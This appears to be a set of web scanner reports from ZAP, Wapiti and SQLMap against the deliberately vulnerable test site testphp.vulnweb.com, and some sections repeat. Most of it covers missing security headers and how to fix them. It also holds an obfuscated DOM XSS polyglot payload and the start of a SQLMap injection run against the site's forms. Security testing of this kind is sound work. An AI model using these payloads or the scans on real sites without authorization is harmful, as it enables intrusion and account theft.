# ZAP Scan Results
**Risk:** Medium
**Name:** Missing Anti-clickjacking Header
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.
**Solution:** Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.
If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
---
**Risk:** Informational
**Name:** Charset Mismatch (Header Versus Meta Content-Type Charset)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.

An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.
**Solution:** Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.
**Reference:** https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection
---
**Risk:** Medium
**Name:** Content Security Policy (CSP) Header Not Set
**URL:** http://testphp.vulnweb.com/login.php
**Description:** Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://www.w3.org/TR/CSP/
https://w3c.github.io/webappsec-csp/
https://web.dev/articles/csp
https://caniuse.com/#feat=contentsecuritypolicy
https://content-security-policy.com/
---
**Risk:** Low
**Name:** Server Leaks Version Information via "Server" HTTP Response Header Field
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.
**Reference:** https://httpd.apache.org/docs/current/mod/core.html#servertokens
https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
https://www.troyhunt.com/shhh-dont-let-your-response-headers/
---
**Risk:** Low
**Name:** X-Content-Type-Options Header Missing
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
**Solution:** Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
**Reference:** https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)
https://owasp.org/www-community/Security_Headers
---
**Risk:** Low
**Name:** Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress "X-Powered-By" headers.
**Reference:** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework
https://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html
---
**Risk:** High
**Name:** Cross Site Scripting (DOM Based)
**URL:** http://testphp.vulnweb.com/login.php#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e
**Description:** Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.

There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.
**Solution:** Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

Phases: Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.

Phase: Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

Phase: Implementation
For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
	
**Reference:** https://owasp.org/www-community/attacks/xss/
https://cwe.mitre.org/data/definitions/79.html
---
# ZAP Scan Results
**Risk:** Medium
**Name:** Missing Anti-clickjacking Header
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.
**Solution:** Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.
If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
---
**Risk:** Informational
**Name:** Charset Mismatch (Header Versus Meta Content-Type Charset)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.

An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.
**Solution:** Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.
**Reference:** https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection
---
**Risk:** Medium
**Name:** Content Security Policy (CSP) Header Not Set
**URL:** http://testphp.vulnweb.com/login.php
**Description:** Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://www.w3.org/TR/CSP/
https://w3c.github.io/webappsec-csp/
https://web.dev/articles/csp
https://caniuse.com/#feat=contentsecuritypolicy
https://content-security-policy.com/
---
**Risk:** Low
**Name:** Server Leaks Version Information via "Server" HTTP Response Header Field
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.
**Reference:** https://httpd.apache.org/docs/current/mod/core.html#servertokens
https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
https://www.troyhunt.com/shhh-dont-let-your-response-headers/
---
**Risk:** Low
**Name:** X-Content-Type-Options Header Missing
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
**Solution:** Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
**Reference:** https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)
https://owasp.org/www-community/Security_Headers
---
**Risk:** Low
**Name:** Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress "X-Powered-By" headers.
**Reference:** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework
https://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html
---
**Risk:** High
**Name:** Cross Site Scripting (DOM Based)
**URL:** http://testphp.vulnweb.com/login.php#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e
**Description:** Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.

There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.
**Solution:** Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

Phases: Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.

Phase: Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

Phase: Implementation
For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
	
**Reference:** https://owasp.org/www-community/attacks/xss/
https://cwe.mitre.org/data/definitions/79.html
---
# Wapiti Scan Results
## Clickjacking Protection
**Path:** /login.php
**Method:** GET
**Info:** X-Frame-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---
## MIME Type Confusion
**Path:** /login.php
**Method:** GET
**Info:** X-Content-Type-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---
# ZAP Scan Results
**Risk:** Medium
**Name:** Missing Anti-clickjacking Header
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.
**Solution:** Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.
If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
---
**Risk:** Informational
**Name:** Charset Mismatch (Header Versus Meta Content-Type Charset)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.

An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.
**Solution:** Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.
**Reference:** https://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection
---
**Risk:** Medium
**Name:** Content Security Policy (CSP) Header Not Set
**URL:** http://testphp.vulnweb.com/login.php
**Description:** Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.
**Reference:** https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://www.w3.org/TR/CSP/
https://w3c.github.io/webappsec-csp/
https://web.dev/articles/csp
https://caniuse.com/#feat=contentsecuritypolicy
https://content-security-policy.com/
---
**Risk:** Low
**Name:** Server Leaks Version Information via "Server" HTTP Response Header Field
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress the "Server" header or provide generic details.
**Reference:** https://httpd.apache.org/docs/current/mod/core.html#servertokens
https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
https://www.troyhunt.com/shhh-dont-let-your-response-headers/
---
**Risk:** Low
**Name:** X-Content-Type-Options Header Missing
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
**Solution:** Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
**Reference:** https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85)
https://owasp.org/www-community/Security_Headers
---
**Risk:** Low
**Name:** Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s)
**URL:** http://testphp.vulnweb.com/login.php
**Description:** The web/application server is leaking information via one or more "X-Powered-By" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.
**Solution:** Ensure that your web server, application server, load balancer, etc. is configured to suppress "X-Powered-By" headers.
**Reference:** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework
https://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html
---
**Risk:** High
**Name:** Cross Site Scripting (DOM Based)
**URL:** http://testphp.vulnweb.com/login.php#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e
**Description:** Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.

There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.
**Solution:** Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

Phases: Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.

Phase: Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

Phase: Implementation
For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
	
**Reference:** https://owasp.org/www-community/attacks/xss/
https://cwe.mitre.org/data/definitions/79.html
---
# Wapiti Scan Results
## Clickjacking Protection
**Path:** /login.php
**Method:** GET
**Info:** X-Frame-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---
## MIME Type Confusion
**Path:** /login.php
**Method:** GET
**Info:** X-Content-Type-Options is not set
**Level:** 1
**Parameter:** 
**Referer:** 
**Module:** http_headers
**HTTP Request:**
```
GET /login.php HTTP/1.1
host: testphp.vulnweb.com
connection: keep-alive
user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
```
**CURL Command:**
```
curl "http://testphp.vulnweb.com/login.php"
```
---

# SQLMap Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.2#pip}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:26:49 /2025-02-22/

[20:26:49] [INFO] testing connection to the target URL
[20:26:49] [INFO] searching for forms
[20:26:50] [INFO] found a total of 2 targets
[1/2] Form:
POST http://testphp.vulnweb.com/search.php?test=query
POST data: searchFor=&goButton=go
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
do you want to fill blank fields with random values? [Y/n] Y
[20:26:50] [INFO] using 'C:\Users\suris\AppData\Local\sqlmap\output\results-02222025_0826pm.csv' as the CSV results file in multiple targets mode
[20:26:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:26:50] [INFO] testing if the target URL content is stable
[20:26:50] [INFO] target URL content is stable
[20:26:50] [INFO] testing if POST parameter 'searchFor' is dynamic
